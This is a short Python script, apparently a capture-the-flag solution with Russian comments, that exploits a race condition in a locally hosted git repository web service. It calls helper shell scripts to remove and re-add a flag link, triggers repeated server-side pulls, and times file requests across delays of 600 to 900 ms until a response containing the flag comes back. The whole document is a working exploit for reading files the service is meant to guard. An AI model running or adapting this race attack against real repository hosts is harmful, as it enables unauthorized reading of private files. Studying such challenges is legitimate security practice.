import subprocess
import threading
import time
import requests

BASE_URL = "http://localhost:8045"
USER = "MrVasya"
NAME = "test"
FILENAME = "flaglink"

DELAY_START = 0.6  # 600 ms
DELAY_END = 0.9    # 900 ms
STEP = 0.02        # 20 ms шаг

FLAG = "FLAG"      # что ищем в теле

def fetch_file(result_container):
    try:
        url = f"{BASE_URL}/repo/{USER}/{NAME}/file/{FILENAME}"
        r = requests.get(url)
        r.raise_for_status()
        if FLAG in r.text:
            result_container['success'] = True
            result_container['content'] = r.text
    except Exception:
        pass

def trigger_update():
    try:
        url = f"{BASE_URL}/repo/{USER}/{NAME}/pull"
        data = {"remote": "origin", "branch": "main"}
        requests.post(url, data=data)
    except Exception:
        pass

def run_script(path):
    subprocess.run([path], check=True)

for delay in [DELAY_START + i*STEP for i in range(int((DELAY_END-DELAY_START)/STEP) + 1)]:
    print(f"Trying delay: {int(delay*1000)} ms")

    # Убираем флаг
    run_script("./remove_flag.sh")

    # Обновляем репо на сервере
    trigger_update()

    # Добавляем флаг
    run_script("./send_flag.sh")

    # Результат гонки
    result = {'success': False, 'content': ''}

    # Потоки: почти одновременно
    t1 = threading.Thread(target=fetch_file, args=(result,))
    t2 = threading.Thread(target=trigger_update)

    t2.start()
    time.sleep(delay)  # задержка между ними
    t1.start()

    t1.join()
    t2.join()

    if result['success']:
        print(f"SUCCESS with delay {int(delay*1000)} ms")
        print(result['content'])
        break
    else:
        print(f"Failed with delay {int(delay*1000)} ms")
